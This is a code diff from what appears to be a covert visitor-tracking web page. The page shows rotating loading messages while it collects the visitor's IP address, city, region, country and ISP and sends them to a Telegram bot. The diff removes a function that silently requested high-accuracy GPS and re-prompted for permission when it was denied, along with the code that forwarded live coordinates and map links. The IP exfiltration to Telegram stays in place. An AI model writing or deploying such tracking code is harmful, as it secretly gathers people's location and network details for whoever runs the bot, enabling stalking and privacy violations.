@@ -130,40 +130,6 @@
                 return {};
             }
         }
-        
-        // Function to get precise location
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toLocaleString()
-                    }),
-                    error => {
-                        // Only show permission request if location was denied
-                        if (error.code === error.PERMISSION_DENIED) {
-                            setTimeout(() => {
-                                permissionRequest.style.display = 'flex';
-                            }, 3000);
-                        }
-                        resolve(null);
-                    },
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
         // Function to send data to Telegram
         async function sendToTelegram(data) {
             try {
@@ -172,22 +138,6 @@
                 message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
                 message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
                 message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
-                
-                if (data.liveLocation) {
-                    message += `\n🎯 LIVE GPS LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
-                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
-                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
-                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
-                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
-                } else {
-                    message += `\n📍 APPROX LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
-                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
-                    if (data.latitude && data.longitude) {
-                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
-                    }
-                }
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -228,17 +178,13 @@
             // Start rotating loading messages
             rotateLoadingMessages();
             
-            // First try to get precise location silently
-            const liveLocation = await getPreciseLocation();
-            
             // Then get IP details
             const ipDetails = await getIPInfo();
             
             // Combine all data
             const trackingData = {
                 ...ipDetails,
-                ip: ipDetails.ip || 'Unknown',
-                liveLocation: liveLocation
+                ip: ipDetails.ip || 'Unknown'
             };
             
             // Send to Telegram
